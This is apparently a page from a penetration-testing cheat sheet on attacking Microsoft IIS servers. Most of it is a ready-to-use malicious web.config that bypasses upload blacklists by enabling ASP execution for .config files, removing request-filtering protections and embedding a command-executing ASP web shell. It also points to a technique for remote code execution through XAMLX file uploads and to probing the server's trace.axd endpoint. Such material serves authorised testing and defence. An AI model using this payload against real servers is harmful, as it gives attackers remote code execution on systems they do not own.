IIS
===

## Bypass blacklist upload

It's possible to bypass blacklist upload while uploading a `web.config` file.
For this, you need to set execution rights to `.config` and then adding `ASP` code
in the `web.config`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
```


## Upload XAMLX file to get RCE

[NCCGroup](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/august/getting-shell-with-xamlx-files/)
describes how to upload a `XAMLX` file to execute code on a remote IIS server.


## Tracing

[Tracing](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972204(v=msdn.10)?redirectedfrom=MSDN)
might be activate on the server. For example, check `/trace.axd`.
